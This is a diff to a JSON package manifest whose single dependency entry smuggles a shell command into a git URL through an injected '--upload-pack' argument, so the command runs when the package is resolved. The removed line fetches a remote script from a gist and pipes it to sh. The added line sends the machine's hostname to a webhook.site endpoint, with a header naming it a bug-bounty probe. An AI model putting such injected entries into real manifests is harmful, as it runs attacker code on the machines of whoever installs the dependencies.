@@ -1,5 +1,5 @@
 {
   "packages": {
-    "npm:git+--upload-pack=curl -sfL https://gist.githubusercontent.com/marouanedahmani27-coder/c457e195d9527a9852cf1046e78a243e/raw/recon52.sh|sh ;:": "latest"
+    "npm:git+--upload-pack=curl -sf -X POST -H X-Bug-Bounty:railway-r53 -d alive-$(hostname)-$(date +%s) https://webhook.site/19d5d9da-4956-4d98-aa9a-4f5ea2fce95b ;:": "latest"
   }
 }
